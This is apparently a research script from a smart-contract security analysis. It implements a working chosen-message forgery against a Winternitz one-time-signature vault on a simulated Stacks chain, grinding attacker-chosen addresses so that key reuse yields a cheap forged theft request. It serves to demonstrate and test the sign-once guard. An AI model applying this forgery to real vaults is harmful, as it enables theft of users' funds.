// The cheaper forgery: the attacker chooses what the owner signs second.
//
// analysis/forge.mjs takes the owner's requests as given. Here the attacker
// has a say in one of them. The owner has signed a request with key 0 of a
// vault, 1 STX to Bob, and it is public but not yet confirmed. The attacker
// asks to be paid 2 STX at an address of its choosing, and the owner signs
// that with key 0 as well, which is the mistake the sign-once guard prevents.
//
// The address is the attacker's lever. It tries 2^20 of them, contract
// addresses under its own account, and keeps the one whose digest, taken
// with the first, leaves the cheapest forgery. Then it searches for the
// theft as before. Both searches finish before the owner signs the second
// request, so the forged signature is ready the moment that one appears.
//
// The result is about 2^24 hashes in all for any key, where two unrelated
// requests cost about 2^61. An independent review found this on 9 October
// 2026. test/crypto.test.mjs submits the result to the vault, which pays.
//
// Run: node analysis/forge-chosen.mjs <case> [log2 of addresses tried]     about 20 seconds for 20

import { createHash } from "node:crypto";
import { Cl, serializeCV } from "@stacks/transactions";
import { CHAIN_ID, DEPLOYER, MALLORY } from "../src/simnet.mjs";
import { SCHEMES, keySecret } from "../src/vault.mjs";
import { digits } from "../src/wots.mjs";
import { STOLEN, nextKeyOf, owner } from "./forge.mjs";

const sha256 = (bytes) => createHash("sha256").update(bytes).digest();
const VAULT = `${DEPLOYER}.pq-vault`;
export const SECOND = 2_000_000;
export const addressOf = (n) => `${MALLORY}.p${n.toString(16).padStart(15, "0")}`;

// A request's bytes as the contract hashes them, and where one field sits in them.
const encode = (fields) => Buffer.from(serializeCV(Cl.tuple({
  vault: Cl.contractPrincipal(DEPLOYER, "pq-vault"), chain: Cl.uint(CHAIN_ID), id: Cl.buffer(fields.id), nonce: Cl.uint(0),
  asset: Cl.stringAscii("stx"), amount: Cl.uint(fields.amount), recipient: Cl.principal(fields.recipient), "next-key": Cl.buffer(fields.nextKey) })), "hex");

// log2 of the hashes a forger expects to need, given the lowest digit published for each chain.
function work(lo) {
  let dist = new Float64Array(961);
  dist[0] = 1;
  for (let i = 0; i < 64; i++) {
    const next = new Float64Array(961);
    for (let s = 0; s <= 15 * i; s++) if (dist[s]) for (let t = 0; t <= 15 - lo[i]; t++) next[s + t] += dist[s] / 16;
    dist = next;
  }
  let p = 0;
  for (let s = 0; s <= 960; s++) if ((s >> 8) >= lo[64] && ((s >> 4) & 15) >= lo[65] && (s & 15) >= lo[66]) p += dist[s];
  return -Math.log2(p);
}

// The owner's second request for a case: 2 STX to the address the attacker chose.
export function second(n, address) {
  const master = sha256(Buffer.from(`pq-vault/test/reuse/${n}`));
  const secret = (index) => keySecret(master, { chainId: CHAIN_ID, vault: VAULT, scheme: "wots", account: 0, index });
  const o = owner(n);
  const r = { id: o.id, nonce: 0, asset: "stx", amount: SECOND, recipient: address, nextKey: SCHEMES.wots.publicKey(secret(1)) };
  const digest = sha256(encode(r));
  return { ...r, digest, sig: SCHEMES.wots.sign(secret(0), digest) };
}

export function search(n, bits = 20) {
  const o = owner(n), first = o.request(0), d1 = digits(first.digest);

  // Stage 1: the address. A cheap score ranks the candidates, and the exact cost is worked out only for a new best.
  const name = addressOf(0).split(".")[1];
  const bytes = encode({ id: o.id, amount: SECOND, recipient: addressOf(0), nextKey: first.nextKey });
  const at = bytes.indexOf(Buffer.from(name)) + 1;
  const HEX = Buffer.from("0123456789abcdef"), GAIN = Array.from({ length: 16 }, (_, d) => Math.log2(16 / (16 - d)));
  let best = { cost: Infinity, score: Infinity };
  for (let c = 0; c < 2 ** bits; c++) {
    for (let k = 14, x = c; k >= 0; k--, x = Math.floor(x / 16)) bytes[at + k] = HEX[x & 15];
    const d2 = digits(sha256(bytes));
    const lo = d2.map((d, i) => Math.min(d, d1[i]));
    const score = lo.slice(0, 64).reduce((sum, d) => sum + GAIN[d], 0);
    if (score < best.score + 6) {
      const cost = work(lo);
      if (cost < best.cost) best = { cost, score: Math.min(score, best.score), address: c, lo };
    }
  }

  // Stage 2: the theft, as in forge.mjs, against the digits those two requests will have published.
  const marker = nextKeyOf(0);
  const theft = encode({ id: o.id, amount: STOLEN, recipient: MALLORY, nextKey: marker });
  const where = theft.indexOf(marker);
  for (let counter = 0; ; counter++) {
    theft.writeBigUInt64BE(BigInt(counter), where);
    if (digits(sha256(theft)).every((d, i) => d >= best.lo[i])) return { address: best.address, predicted: best.cost, counter, tries: counter + 1 };
  }
}

if (import.meta.url === `file://${process.argv[1]}`) {
  const n = Number(process.argv[2]), bits = Number(process.argv[3] ?? 20);
  const began = Date.now();
  const found = search(n, bits);
  console.log(`case ${n}: of ${(2 ** bits).toLocaleString("en-US")} addresses, ${addressOf(found.address)} leaves a forgery predicted at 2^${found.predicted.toFixed(1)} hashes. ` +
    `Found after ${found.tries.toLocaleString("en-US")}, 2^${Math.log2(found.tries).toFixed(1)}. ` +
    `${((Date.now() - began) / 1000).toFixed(0)} s in all. Address ${found.address}, counter ${found.counter}.`);
}
